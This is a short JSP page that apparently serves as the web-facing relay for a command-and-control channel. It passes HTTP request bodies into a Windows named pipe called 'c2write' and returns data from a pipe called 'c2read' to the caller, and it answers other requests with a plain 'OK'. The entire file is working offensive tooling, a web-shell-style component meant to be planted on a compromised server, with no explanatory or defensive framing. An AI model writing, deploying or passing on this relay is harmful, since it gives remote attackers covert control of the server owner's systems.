<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*,java.util.*,java.nio.*" %>

<%!
    public static class Pipe
    {
        public static byte[] ReadPipe(String pipeName){
            String _pipeName = "\\\\.\\Pipe\\"+pipeName;
            try {
                byte[] sizeByte = new byte[4];
                RandomAccessFile pipe = new RandomAccessFile(_pipeName, "r");
                pipe.read(sizeByte,0,4);
                ByteBuffer wrapped = ByteBuffer.wrap(sizeByte);
                wrapped.order(ByteOrder.LITTLE_ENDIAN);
                int size = wrapped.getInt();
                byte[] dataBuffer = new byte[size];
                pipe.read(dataBuffer,0,size);
                pipe.close();
                return dataBuffer;
            } catch (Exception e) {
                return null;
            }
        }
        public static void WritePipe(String pipeName,byte[] data){
            String _pipeName = "\\\\.\\Pipe\\"+pipeName;
            try {
                RandomAccessFile pipe = new RandomAccessFile(_pipeName, "rw");
                pipe.write(data);
                pipe.close();
            } catch (Exception e) {}
        }
    }
%>
<%


    try{
		String mode = request.getParameter("mode");
        if(mode!=null)
        {

            if("read".equals(mode)) {
                byte[] data= Pipe.ReadPipe("c2read");
                response.getOutputStream().write(data);
            }
            else if("write".equals(mode)) {
                int len = request.getContentLength();
                byte[] data= new byte[len];
                request.getInputStream().read(data);
                Pipe.WritePipe("c2write",data);
            }
        }else{
            response.getOutputStream().print("OK");
        }
    } catch (Exception e) {}
%>